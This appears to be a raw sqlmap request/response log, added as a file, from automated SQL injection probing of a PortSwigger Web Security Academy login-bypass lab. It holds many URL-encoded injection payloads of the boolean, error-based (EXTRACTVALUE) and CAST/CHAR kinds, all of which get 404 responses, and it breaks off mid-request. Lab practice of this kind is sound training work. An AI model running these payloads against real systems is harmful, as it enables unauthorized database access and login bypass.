@@ -1,0 +1,1622 @@
+HTTP request [#1]:
+GET /login HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#1] (200 OK):
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq; Secure; HttpOnly; SameSite=None
+Connection: close
+Content-Length: 2893
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labs.css rel=stylesheet>
+        <title>SQL injection vulnerability allowing login bypass</title>
+    </head>
+    <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+    <section class='academyLabBanner'>
+        <div class=container>
+            <div class=logo></div>
+                <div class=title-container>
+                    <h2>SQL injection vulnerability allowing login bypass</h2>
+                    <a class=link-back href='https://portswigger.net/web-security/sql-injection/lab-login-bypass'>
+                        Back\xa0to\xa0lab\xa0description\xa0
+                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                            <g>
+                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                            </g>
+                        </svg>
+                    </a>
+                </div>
+                <div class='widgetcontainer-lab-status is-notsolved'>
+                    <span>LAB</span>
+                    <p>Not solved</p>
+                    <span class=lab-status-icon></span>
+                </div>
+            </div>
+        </div>
+    </section>
+</div>
+        <div theme="">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                            <a href="/my-account">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <h1>Login</h1>
+                    <section>
+                        <form class=login-form method=POST action=/login>
+                            <input required type="hidden" name="csrf" value="fKWiv40XaMTAVVU1s7q7nwnc6hs7LUkc">
+                            <label>Username</label>
+                            <input required type=username name="username">
+                            <label>Password</label>
+                            <input required type=password name="password">
+                            <button class=button type=submit> Log in </button>
+                        </form>
+                    </section>
+                </div>
+            </section>
+        </div>
+    </body>
+</html>
+
+
+############################################################################
+
+HTTP request [#2]:
+GET /login HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#2] (200 OK):
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 2893
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labs.css rel=stylesheet>
+        <title>SQL injection vulnerability allowing login bypass</title>
+    </head>
+    <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+    <section class='academyLabBanner'>
+        <div class=container>
+            <div class=logo></div>
+                <div class=title-container>
+                    <h2>SQL injection vulnerability allowing login bypass</h2>
+                    <a class=link-back href='https://portswigger.net/web-security/sql-injection/lab-login-bypass'>
+                        Back\xa0to\xa0lab\xa0description\xa0
+                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                            <g>
+                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                            </g>
+                        </svg>
+                    </a>
+                </div>
+                <div class='widgetcontainer-lab-status is-notsolved'>
+                    <span>LAB</span>
+                    <p>Not solved</p>
+                    <span class=lab-status-icon></span>
+                </div>
+            </div>
+        </div>
+    </section>
+</div>
+        <div theme="">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                            <a href="/my-account">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <h1>Login</h1>
+                    <section>
+                        <form class=login-form method=POST action=/login>
+                            <input required type="hidden" name="csrf" value="fKWiv40XaMTAVVU1s7q7nwnc6hs7LUkc">
+                            <label>Username</label>
+                            <input required type=username name="username">
+                            <label>Password</label>
+                            <input required type=password name="password">
+                            <button class=button type=submit> Log in </button>
+                        </form>
+                    </section>
+                </div>
+            </section>
+        </div>
+    </body>
+</html>
+
+
+############################################################################
+
+HTTP request [#3]:
+GET /1800 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#3] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/1800
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#4]:
+GET /login%29%27%28%28%22..%28%2C. HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#4] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%27%28%28%22..%28%2C.
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#5]:
+GET /login%27tCfXcJ%3C%27%22%3EpgmPBd HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#5] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27tCfXcJ%3C%27%22%3EpgmPBd
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#6]:
+GET /login%29%20AND%207653%3D6765%20AND%20%288119%3D8119 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#6] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%207653%3D6765%20AND%20%288119%3D8119
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#7]:
+GET /login%29%20AND%204842%3D4842%20AND%20%289510%3D9510 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#7] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%204842%3D4842%20AND%20%289510%3D9510
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#8]:
+GET /login%20AND%204447%3D4694 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#8] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%204447%3D4694
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#9]:
+GET /login%20AND%204842%3D4842 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#9] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%204842%3D4842
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#10]:
+GET /login%27%29%20AND%209066%3D5568%20AND%20%28%27JpDd%27%3D%27JpDd HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#10] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%209066%3D5568%20AND%20%28%27JpDd%27%3D%27JpDd
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#11]:
+GET /login%27%29%20AND%204842%3D4842%20AND%20%28%27UMuL%27%3D%27UMuL HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#11] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%204842%3D4842%20AND%20%28%27UMuL%27%3D%27UMuL
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#12]:
+GET /login%27%20AND%203994%3D6398%20AND%20%27yjRn%27%3D%27yjRn HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#12] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%203994%3D6398%20AND%20%27yjRn%27%3D%27yjRn
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#13]:
+GET /login%27%20AND%204842%3D4842%20AND%20%27BsbM%27%3D%27BsbM HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#13] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%204842%3D4842%20AND%20%27BsbM%27%3D%27BsbM
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#14]:
+GET /login%20AND%209171%3D9648--%20deAK HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#14] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%209171%3D9648--%20deAK
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#15]:
+GET /login%20AND%204842%3D4842--%20mhOx HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#15] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%204842%3D4842--%20mhOx
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#16]:
+GET /%28SELECT%20%28CASE%20WHEN%20%284172%3D1845%29%20THEN%20%27login%27%20ELSE%20%28SELECT%201845%20UNION%20SELECT%205863%29%20END%29%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#16] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/%28SELECT%20%28CASE%20WHEN%20%284172%3D1845%29%20THEN%20%27login%27%20ELSE%20%28SELECT%201845%20UNION%20SELECT%205863%29%20END%29%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#17]:
+GET /%28SELECT%20%28CASE%20WHEN%20%284109%3D4109%29%20THEN%20%27login%27%20ELSE%20%28SELECT%203778%20UNION%20SELECT%202391%29%20END%29%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#17] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/%28SELECT%20%28CASE%20WHEN%20%284109%3D4109%29%20THEN%20%27login%27%20ELSE%20%28SELECT%203778%20UNION%20SELECT%202391%29%20END%29%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#18]:
+GET /login%29%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29%20AND%20%284833%3D4833 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#18] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29%20AND%20%284833%3D4833
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#19]:
+GET /login%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#19] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#20]:
+GET /login%27%29%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29%20AND%20%28%27hGdq%27%3D%27hGdq HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#20] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29%20AND%20%28%27hGdq%27%3D%27hGdq
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#21]:
+GET /login%27%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29%20AND%20%27NBOQ%27%3D%27NBOQ HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#21] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29%20AND%20%27NBOQ%27%3D%27NBOQ
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#22]:
+GET /login%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29--%20vFgJ HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#22] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%20EXTRACTVALUE%282769%2CCONCAT%280x5c%2C0x7170717071%2C%28SELECT%20%28ELT%282769%3D2769%2C1%29%29%29%2C0x71626b7871%29%29--%20vFgJ
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#23]:
+GET /login%29%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%283537%3D3537 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#23] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%283537%3D3537
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#24]:
+GET /login%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#24] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#25]:
+GET /login%27%29%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27qjaU%27%3D%27qjaU HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#25] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27qjaU%27%3D%27qjaU
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#26]:
+GET /login%27%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27cjDg%27%3D%27cjDg HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#26] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27cjDg%27%3D%27cjDg
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#27]:
+GET /login%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20Cmqv HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#27] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%205313%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285313%3D5313%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20Cmqv
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#28]:
+GET /login%29%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%289752%3D9752 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#28] (404 Not Found):
